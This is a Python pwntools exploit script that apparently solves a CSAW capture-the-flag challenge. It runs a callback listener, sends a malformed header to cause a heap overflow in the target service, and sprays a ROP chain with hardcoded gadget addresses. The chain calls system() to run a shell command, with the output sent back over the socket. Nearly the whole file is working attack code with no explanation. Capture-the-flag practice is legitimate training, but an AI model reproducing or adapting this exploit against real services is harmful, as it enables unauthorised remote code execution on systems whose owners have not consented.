from pwn import *
import socket
import threading
import random

p = random.randint(20000, 50000)
num_threads = 90

command = '/bin/ls >&4\0'
# command = '/bin/cat flag.txt >&4\0'

def thread_listen(port=9999):
    l = socket.socket()
    # print("About to listen")
    l.bind(('0.0.0.0', port))
    l.listen(5)

    for i in xrange(num_threads):
        c, _ = l.accept()
        if i < 1:
            t = threading.Thread(target=thread_send, args=(c, 0xffff, 0x9000))
        else:
            t = threading.Thread(target=thread_send, args=(c, 0x20-0x3, 0x3, i))
        t.start()

def thread_send(c, size1, size2, index=0xffff):
    version = p16(1)

    # malloc(size1 + size2 + 8)
    # size1 = p16(size1) # 16 bit size
    # psize2 = p32(size2) # 32 bit size, must be <= 0x40000000
    # header = version + p16(size1) + p32(size2) + '\n\n'
    header = version + p16(size1) + p32(size2)
    c.send(header)

    recv = p32(0x8048be5)
    system = p32(0x80496de)
    ret = p32(0x8049702)
    adjust = p32(0x80487ee)

    rop = []
    for _ in xrange(50):
        rop.append(ret)
    rop.append(recv)
    rop.append(adjust)
    rop.append(p32(4)) # Original thread fd
    rop.append(p32(0x804c098)) # Global address to read into
    rop.append(p32(len(command))) 
    rop.append(system)
    rop.append(p32(0x804c098))
    rop.append(p32(0x80808080)) # End the copy

    rop = ''.join(rop)

    if size1 == 0xffff:
        buff = ['\x11\x22']
        for _ in xrange((size1+size2)/0x200):
            buff += '\xff' * (0x200 - len(rop))
            buff += rop

        for i in xrange(len(buff) % 4):
            buff += '\x80'

        buff = ''.join(buff)
        print(len(buff))
        print(len(buff) % 4 == 0)
        c.send(buff)
    else:
        buff = p8(0xff) * (size1)
        buff += p8(0x84) # Signed first bit
        buff += p8(0x7f)
        buff += p8(0xff)
        buff += p8(0xff)
        if c:
            try:
                c.send(buff)
            except:
                pass
        
def start_threads():
    t = threading.Thread(target=thread_listen, args=(p, ))
    t.daemon = True
    t.start()
    return t

curr_t = start_threads()

r = remote('172.17.0.6', 24242)
# r = remote('pwn.chal.csaw.io', 8004)

n_threads = p16(num_threads)
connect_host = socket.inet_aton('172.17.0.1')

payload = n_threads
payload += p16(p) #port
payload += connect_host

print("Sending : {}".format(payload))
r.sendline(payload)
for _ in xrange(10):
    r.sendline(command)

r.interactive()
# curr_t.join()

